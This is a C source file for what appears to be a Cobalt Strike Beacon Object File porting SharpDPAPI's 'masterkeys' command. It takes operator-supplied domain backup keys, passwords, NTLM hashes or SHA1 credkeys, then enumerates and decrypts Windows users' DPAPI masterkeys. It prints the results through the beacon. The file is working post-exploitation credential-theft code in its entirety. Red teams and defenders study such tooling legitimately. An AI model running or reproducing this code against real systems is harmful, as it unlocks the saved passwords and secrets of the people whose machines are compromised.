/*
 * masterkeys.c — BOF for DPAPI masterkey triage
 *
 * Usage:
 *   masterkeys [/pvk:BASE64] [/password:PASSWORD] [/ntlm:HASH]
 *              [/credkey:KEY] [/rpc] [/server:SERVER] [/target:PATH]
 *              [/sid:SID] [/hashes]
 *
 * Enumerates and decrypts user DPAPI masterkeys.
 */
#include "beacon.h"
#include "bofdefs.h"
#include "dpapi_common.h"
#include "triage.h"
#include "helpers.h"

void go(char* args, int args_len) {
    datap parser;
    BeaconDataParse(&parser, args, args_len);

    /* Parse arguments from CNA */
    char* pvk_b64    = BeaconDataExtract(&parser, NULL);
    char* password   = BeaconDataExtract(&parser, NULL);
    char* ntlm       = BeaconDataExtract(&parser, NULL);
    char* credkey    = BeaconDataExtract(&parser, NULL);
    char* target_str = BeaconDataExtract(&parser, NULL);
    char* server_str = BeaconDataExtract(&parser, NULL);
    char* sid_str    = BeaconDataExtract(&parser, NULL);
    int   use_rpc    = BeaconDataInt(&parser);
    int   hashes     = BeaconDataInt(&parser);

    /* Decode PVK if provided */
    BYTE* pvk = NULL;
    int pvk_len = 0;
    if (pvk_b64 && strlen(pvk_b64) > 0) {
        pvk = base64_decode(pvk_b64, &pvk_len);
    }

    /* Convert target/server to wide */
    wchar_t* target = NULL;
    wchar_t* server = NULL;
    if (target_str && strlen(target_str) > 0) target = utf8_to_wide(target_str);
    if (server_str && strlen(server_str) > 0) server = utf8_to_wide(server_str);

    /* Initialize masterkey cache */
    MASTERKEY_CACHE cache;
    mk_cache_init(&cache);

    /* Parse {GUID}:SHA1 pairs if provided via /credkey */
    if (credkey && strlen(credkey) > 0) {
        /* credkey format: {GUID1}:SHA1_HEX,{GUID2}:SHA1_HEX,... */
        char* ck = (char*)intAlloc(strlen(credkey) + 1);
        if (ck) {
            strcpy(ck, credkey);
            char* pair = strtok(ck, ",");
            while (pair) {
                char* colon = strchr(pair, ':');
                if (colon) {
                    *colon = 0;
                    char* guid_str = pair;
                    char* sha1_hex = colon + 1;

                    GUID guid;
                    if (string_to_guid(guid_str, &guid)) {
                        int sha1_len = 0;
                        BYTE* sha1 = hex_to_bytes(sha1_hex, &sha1_len);
                        if (sha1 && sha1_len == 20) {
                            mk_cache_add(&cache, &guid, sha1);
                        }
                        if (sha1) intFree(sha1);
                    }
                }
                pair = strtok(NULL, ",");
            }
            intFree(ck);
        }
        if (cache.count > 0) {
            BeaconPrintf(CALLBACK_OUTPUT, "[*] Loaded %d masterkeys from /credkey\n", cache.count);
        }
    }

    BeaconPrintf(CALLBACK_OUTPUT,
        "\n=== SharpDPAPI Masterkeys (BOF) ===\n");

    /* Triage masterkeys */
    BOOL result = triage_user_masterkeys(
        &cache, pvk, pvk_len,
        (password && strlen(password) > 0) ? password : NULL,
        (ntlm && strlen(ntlm) > 0) ? ntlm : NULL,
        (credkey && strlen(credkey) > 0) ? credkey : NULL,
        (BOOL)use_rpc,
        target, server,
        (BOOL)hashes,
        (sid_str && strlen(sid_str) > 0) ? sid_str : NULL
    );

    if (result) {
        mk_cache_print(&cache);
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] No masterkeys decrypted\n");
    }

    /* Cleanup */
    mk_cache_free(&cache);
    if (pvk) intFree(pvk);
    if (target) intFree(target);
    if (server) intFree(server);
}
